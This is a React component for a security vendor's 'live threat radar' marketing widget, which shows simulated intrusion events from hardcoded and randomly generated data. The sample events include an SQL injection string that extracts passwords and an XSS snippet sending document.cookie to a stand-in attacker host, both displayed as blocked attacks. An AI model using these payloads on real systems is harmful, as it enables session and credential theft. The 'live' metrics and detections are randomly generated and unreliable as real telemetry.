import React, { useState, useEffect } from 'react';
import { Shield, Radio, AlertTriangle, CheckCircle2, Play, Pause, Terminal, Zap, Globe, RefreshCw } from 'lucide-react';
import { ThreatEvent } from '../types';

const INITIAL_EVENTS: ThreatEvent[] = [
  {
    id: 'TRT-9042',
    timestamp: new Date().toLocaleTimeString(),
    sourceIp: '185.220.101.5',
    location: 'Frankfurt, DE',
    targetService: '/api/v2/auth/jwt-issue',
    attackType: 'SQL Injection',
    severity: 'CRITICAL',
    confidenceScore: 99.8,
    status: 'BLOCKED',
    payloadSnippet: "SELECT * FROM users WHERE user='admin' UNION SELECT password, secret FROM vaults--"
  },
  {
    id: 'TRT-9041',
    timestamp: new Date(Date.now() - 3000).toLocaleTimeString(),
    sourceIp: '103.251.170.89',
    location: 'Singapore, SG',
    targetService: 'ingress-controller:443',
    attackType: 'DDoS Flood',
    severity: 'HIGH',
    confidenceScore: 98.4,
    status: 'ISOLATED',
    payloadSnippet: 'SYN_FLOOD_BURST_RATE: 450,000 req/sec from botnet cluster #812'
  },
  {
    id: 'TRT-9040',
    timestamp: new Date(Date.now() - 7000).toLocaleTimeString(),
    sourceIp: '194.26.29.114',
    location: 'Moscow, RU',
    targetService: '/k8s/etcd-cluster',
    attackType: 'Ransomware Beacon',
    severity: 'CRITICAL',
    confidenceScore: 99.9,
    status: 'BLOCKED',
    payloadSnippet: 'POST /v1/beacon HTTP/1.1 Payload: encrypted_key_exchange_attempt_v4'
  },
  {
    id: 'TRT-9039',
    timestamp: new Date(Date.now() - 11000).toLocaleTimeString(),
    sourceIp: '45.142.214.202',
    location: 'Bucharest, RO',
    targetService: '/portal/comments/submit',
    attackType: 'XSS Payload',
    severity: 'MEDIUM',
    confidenceScore: 94.2,
    status: 'MITIGATED',
    payloadSnippet: '<script>fetch("http://evil-c2.io/steal?cookie="+document.cookie)</script>'
  },
  {
    id: 'TRT-9038',
    timestamp: new Date(Date.now() - 15000).toLocaleTimeString(),
    sourceIp: '112.196.40.10',
    location: 'Mumbai, IN',
    targetService: 'sshd:22 (bastion-node-01)',
    attackType: 'SSH Brute Force',
    severity: 'HIGH',
    confidenceScore: 97.6,
    status: 'BLOCKED',
    payloadSnippet: 'SSH-2.0-OpenSSH_8.2p1 authentication failures exceeding baseline threshold (84/sec)'
  }
];

const SAMPLE_ATTACK_TYPES = [
  'SQL Injection',
  'DDoS Flood',
  'Ransomware Beacon',
  'XSS Payload',
  'SSH Brute Force'
] as const;

const SAMPLE_LOCATIONS = [
  'Amsterdam, NL', 'Tokyo, JP', 'São Paulo, BR', 'London, UK',
  'Seoul, KR', 'Toronto, CA', 'Sydney, AU', 'Warsaw, PL'
];

const SAMPLE_IPS = [
  '185.191.171.12', '104.28.19.44', '203.0.113.195', '198.51.100.77',
  '45.33.22.11', '162.243.189.2', '91.240.118.80', '193.106.191.10'
];

export const LiveRadarWidget: React.FC = () => {
  const [events, setEvents] = useState<ThreatEvent[]>(INITIAL_EVENTS);
  const [isLive, setIsLive] = useState<boolean>(true);
  const [packetsInspected, setPacketsInspected] = useState<number>(1482910);
  const [activeProbes, setActiveProbes] = useState<number>(14290);
  const [zeroDays, setZeroDays] = useState<number>(42);
  const [selectedEvent, setSelectedEvent] = useState<ThreatEvent | null>(INITIAL_EVENTS[0]);

  useEffect(() => {
    if (!isLive) return;

    const interval = setInterval(() => {
      // Generate realistic dynamic event
      const attackType = SAMPLE_ATTACK_TYPES[Math.floor(Math.random() * SAMPLE_ATTACK_TYPES.length)];
      const location = SAMPLE_LOCATIONS[Math.floor(Math.random() * SAMPLE_LOCATIONS.length)];
      const sourceIp = SAMPLE_IPS[Math.floor(Math.random() * SAMPLE_IPS.length)];
      const id = `TRT-${Math.floor(9043 + Math.random() * 900)}`;
      const severity = attackType === 'Ransomware Beacon' || attackType === 'SQL Injection' ? 'CRITICAL' : attackType === 'DDoS Flood' ? 'HIGH' : 'MEDIUM';
      const confidenceScore = Number((94 + Math.random() * 5.9).toFixed(1));

      const newEvent: ThreatEvent = {
        id,
        timestamp: new Date().toLocaleTimeString(),
        sourceIp,
        location,
        targetService: `/api/v1/internal/${attackType.toLowerCase().replace(/\s+/g, '-')}`,
        attackType,
        severity,
        confidenceScore,
        status: confidenceScore > 98 ? 'BLOCKED' : 'ISOLATED',
        payloadSnippet: `AUTOMATED_INSPECTION_PAYLOAD: Pattern identified matching CVE-2026-X81 signature on ${sourceIp}`
      };

      setEvents(prev => [newEvent, ...prev.slice(0, 9)]);
      setPacketsInspected(prev => prev + Math.floor(1200 + Math.random() * 2500));
      setActiveProbes(prev => prev + (Math.random() > 0.5 ? 1 : -1));
      if (Math.random() > 0.85) {
        setZeroDays(prev => prev + 1);
      }
    }, 3500);

    return () => clearInterval(interval);
  }, [isLive]);

  return (
    <div id="radar" className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-16">
      
      {/* Background glow effects */}
      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-cyan-500/10 blur-[120px] rounded-full pointer-events-none" />

      {/* Header section */}
      <div className="flex flex-col md:flex-row md:items-end justify-between gap-6 mb-8">
        <div>
          <div className="flex items-center gap-2 text-xs font-mono text-cyan-400 mb-2 uppercase tracking-widest">
            <Radio className="w-4 h-4 animate-pulse text-cyan-400" />
            <span>GLOBAL THREAT CORRELATION MESH</span>
          </div>
          <h2 className="text-2xl sm:text-4xl font-extrabold text-white font-mono tracking-tight">
            Real-Time Network Telemetry Radar
          </h2>
          <p className="text-slate-400 text-sm mt-1 max-w-2xl">
            Live eBPF packet inspection streams across global edge clusters with sub-millisecond AI anomaly scoring.
          </p>
        </div>

        {/* Live Controls */}
        <div className="flex items-center gap-3">
          <button
            onClick={() => setIsLive(!isLive)}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono font-semibold flex items-center gap-2 border transition-all cursor-pointer ${
              isLive
                ? 'bg-emerald-950/60 text-emerald-400 border-emerald-500/30 hover:bg-emerald-900/40'
                : 'bg-amber-950/60 text-amber-400 border-amber-500/30 hover:bg-amber-900/40'
            }`}
          >
            {isLive ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5" />}
            <span>{isLive ? 'STREAMING LIVE' : 'STREAM PAUSED'}</span>
          </button>
          <div className="bg-slate-900/90 border border-slate-800 rounded-lg px-3 py-1.5 text-xs font-mono text-slate-400 flex items-center gap-2">
            <Globe className="w-3.5 h-3.5 text-cyan-400" />
            <span>14 GLOBAL REGIONS</span>
          </div>
        </div>
      </div>

      {/* Metrics Ticker */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
        <div className="glass-card p-4 rounded-xl border border-slate-800">
          <div className="text-[11px] font-mono text-slate-400 uppercase tracking-wider">Packets Inspected / Sec</div>
          <div className="text-xl sm:text-2xl font-bold font-mono text-cyan-400 mt-1 flex items-center gap-2">
            <span>{packetsInspected.toLocaleString()}</span>
            <Zap className="w-4 h-4 text-cyan-400 fill-cyan-400/20" />
          </div>
          <div className="text-[10px] text-emerald-400 font-mono mt-1">↑ +14.2% peak surge absorbed</div>
        </div>

        <div className="glass-card p-4 rounded-xl border border-slate-800">
          <div className="text-[11px] font-mono text-slate-400 uppercase tracking-wider">Active Threat Probes</div>
          <div className="text-xl sm:text-2xl font-bold font-mono text-amber-400 mt-1">
            {activeProbes.toLocaleString()}
          </div>
          <div className="text-[10px] text-slate-400 font-mono mt-1">Filtered across perimeter nodes</div>
        </div>

        <div className="glass-card p-4 rounded-xl border border-slate-800">
          <div className="text-[11px] font-mono text-slate-400 uppercase tracking-wider">Zero-Day Attacks Prevented</div>
          <div className="text-xl sm:text-2xl font-bold font-mono text-emerald-400 mt-1">
            {zeroDays}
          </div>
          <div className="text-[10px] text-emerald-400 font-mono mt-1">100% confidence mitigation rate</div>
        </div>

        <div className="glass-card p-4 rounded-xl border border-slate-800">
          <div className="text-[11px] font-mono text-slate-400 uppercase tracking-wider">Avg AI Inspection Latency</div>
          <div className="text-xl sm:text-2xl font-bold font-mono text-white mt-1">
            0.78 ms
          </div>
          <div className="text-[10px] text-cyan-400 font-mono mt-1">Kernel-space eBPF execution</div>
        </div>
      </div>

      {/* Main Grid: Radar Screen + Live Event Feed */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Radar Graphic Panel (5 cols) */}
        <div className="lg:col-span-5 glass-card rounded-2xl p-6 border border-slate-800 flex flex-col items-center justify-center relative overflow-hidden min-h-[380px]">
          
          <div className="absolute top-3 left-4 flex items-center gap-2 text-xs font-mono text-slate-400">
            <span className="w-2 h-2 rounded-full bg-cyan-400 animate-ping" />
            <span>RADAR SCOPE // SWEEP ACTIVE</span>
          </div>

          <div className="absolute top-3 right-4 text-[11px] font-mono text-cyan-400 bg-cyan-950/60 px-2 py-0.5 rounded border border-cyan-800">
            RANGE: 50,000 KM
          </div>

          {/* Concentric Radar Rings */}
          <div className="relative w-64 h-64 sm:w-72 sm:h-72 rounded-full border border-cyan-500/20 flex items-center justify-center bg-cyan-950/10">
            <div className="w-48 h-48 sm:w-52 sm:h-52 rounded-full border border-cyan-500/30 flex items-center justify-center">
              <div className="w-32 h-32 sm:w-36 sm:h-36 rounded-full border border-cyan-500/40 flex items-center justify-center">
                <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-full border border-cyan-500/60 flex items-center justify-center">
                  <div className="w-3 h-3 rounded-full bg-cyan-400 shadow-[0_0_12px_#00f0ff]" />
                </div>
              </div>
            </div>

            {/* Crosshairs */}
            <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
              <div className="w-full h-[1px] bg-cyan-500/20" />
              <div className="h-full w-[1px] bg-cyan-500/20 absolute" />
            </div>

            {/* Sweep Line */}
            <div className="absolute inset-0 rounded-full overflow-hidden pointer-events-none">
              <div className="w-1/2 h-1/2 bg-gradient-to-br from-cyan-400/40 via-cyan-500/10 to-transparent origin-bottom-right animate-radar-sweep" />
            </div>

            {/* Simulated Threat Target Ping Markers */}
            <div className="absolute top-12 left-20 group cursor-pointer" onClick={() => setSelectedEvent(events[0])}>
              <div className="w-3 h-3 rounded-full bg-rose-500 animate-ping" />
              <div className="w-2.5 h-2.5 rounded-full bg-rose-500 absolute top-0.25 left-0.25 shadow-[0_0_8px_#f43f5e]" />
              <span className="hidden group-hover:block absolute left-4 -top-2 bg-slate-900 border border-rose-500 text-[10px] font-mono text-rose-300 px-2 py-0.5 rounded whitespace-nowrap z-20">
                SQLi (DE) - 99.8%
              </span>
            </div>

            <div className="absolute bottom-16 right-12 group cursor-pointer" onClick={() => setSelectedEvent(events[1])}>
              <div className="w-3 h-3 rounded-full bg-amber-500 animate-ping" />
              <div className="w-2.5 h-2.5 rounded-full bg-amber-500 absolute top-0.25 left-0.25 shadow-[0_0_8px_#f59e0b]" />
              <span className="hidden group-hover:block absolute right-4 -top-2 bg-slate-900 border border-amber-500 text-[10px] font-mono text-amber-300 px-2 py-0.5 rounded whitespace-nowrap z-20">
                DDoS (SG) - 98.4%
              </span>
            </div>

            <div className="absolute top-28 right-16 group cursor-pointer" onClick={() => setSelectedEvent(events[2])}>
              <div className="w-3 h-3 rounded-full bg-rose-500 animate-ping" />
              <div className="w-2.5 h-2.5 rounded-full bg-rose-500 absolute top-0.25 left-0.25 shadow-[0_0_8px_#f43f5e]" />
              <span className="hidden group-hover:block absolute left-4 -top-2 bg-slate-900 border border-rose-500 text-[10px] font-mono text-rose-300 px-2 py-0.5 rounded whitespace-nowrap z-20">
                Ransomware (RU) - 99.9%
              </span>
            </div>

            <div className="absolute bottom-10 left-16 group cursor-pointer">
              <div className="w-2.5 h-2.5 rounded-full bg-cyan-400 shadow-[0_0_8px_#00f0ff]" />
            </div>
          </div>

          <div className="mt-4 text-[11px] font-mono text-slate-400 flex items-center gap-4">
            <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-rose-500" /> Critical Anomaly</span>
            <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-amber-500" /> High Suspicion</span>
            <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-cyan-400" /> Safe Node</span>
          </div>
        </div>

        {/* Live Stream Table Panel (7 cols) */}
        <div className="lg:col-span-7 glass-card rounded-2xl p-4 sm:p-6 border border-slate-800 flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-3 border-b border-slate-800 mb-3">
              <div className="flex items-center gap-2">
                <Terminal className="w-4 h-4 text-cyan-400" />
                <span className="font-mono text-xs font-bold uppercase text-white tracking-wider">
                  Live Intrusion Event Stream
                </span>
              </div>
              <span className="text-[11px] font-mono text-slate-400">
                Auto-updating every 3.5s
              </span>
            </div>

            {/* List of events */}
            <div className="space-y-2.5 max-h-[300px] overflow-y-auto pr-1">
              {events.map((ev) => (
                <div
                  key={ev.id}
                  onClick={() => setSelectedEvent(ev)}
                  className={`p-3 rounded-xl border transition-all cursor-pointer font-mono text-xs flex flex-col sm:flex-row sm:items-center justify-between gap-2 ${
                    selectedEvent?.id === ev.id
                      ? 'bg-cyan-950/40 border-cyan-500/50 shadow-[0_0_15px_rgba(0,240,255,0.15)]'
                      : 'bg-slate-900/60 border-slate-800/80 hover:bg-slate-800/60 hover:border-slate-700'
                  }`}
                >
                  <div className="flex items-center gap-2.5">
                    <span className={`px-2 py-0.5 text-[10px] rounded font-bold uppercase ${
                      ev.severity === 'CRITICAL' ? 'bg-rose-950 text-rose-400 border border-rose-800' :
                      ev.severity === 'HIGH' ? 'bg-amber-950 text-amber-400 border border-amber-800' :
                      'bg-sky-950 text-sky-400 border border-sky-800'
                    }`}>
                      {ev.severity}
                    </span>
                    <div>
                      <div className="text-white font-semibold flex items-center gap-2">
                        <span>{ev.attackType}</span>
                        <span className="text-slate-500 text-[10px]">({ev.sourceIp})</span>
                      </div>
                      <div className="text-[11px] text-slate-400 truncate max-w-[220px] sm:max-w-[320px]">
                        Target: <span className="text-slate-300">{ev.targetService}</span>
                      </div>
                    </div>
                  </div>

                  <div className="flex items-center justify-between sm:justify-end gap-3 pt-1 sm:pt-0 border-t sm:border-0 border-slate-800">
                    <div className="text-right">
                      <div className="text-cyan-400 font-bold text-[11px]">{ev.confidenceScore}% AI Confidence</div>
                      <div className="text-[10px] text-slate-500">{ev.timestamp} • {ev.location}</div>
                    </div>
                    <span className={`px-2 py-1 rounded text-[10px] font-bold ${
                      ev.status === 'BLOCKED' ? 'bg-emerald-950/80 text-emerald-400 border border-emerald-800' : 'bg-cyan-950/80 text-cyan-400 border border-cyan-800'
                    }`}>
                      {ev.status}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Bottom Event Payload Inspector Drawer */}
          {selectedEvent && (
            <div className="mt-4 p-3 bg-slate-950 rounded-xl border border-cyan-500/20 text-xs font-mono">
              <div className="flex items-center justify-between text-slate-400 text-[11px] pb-1.5 mb-1.5 border-b border-slate-800">
                <span className="text-cyan-400 font-bold">INSPECTOR: {selectedEvent.id}</span>
                <span>ORIGIN: {selectedEvent.location} ({selectedEvent.sourceIp})</span>
              </div>
              <div className="text-slate-300 break-all text-[11px] bg-slate-900/80 p-2 rounded border border-slate-800 text-rose-300">
                <code>{selectedEvent.payloadSnippet}</code>
              </div>
            </div>
          )}

        </div>

      </div>

    </div>
  );
};
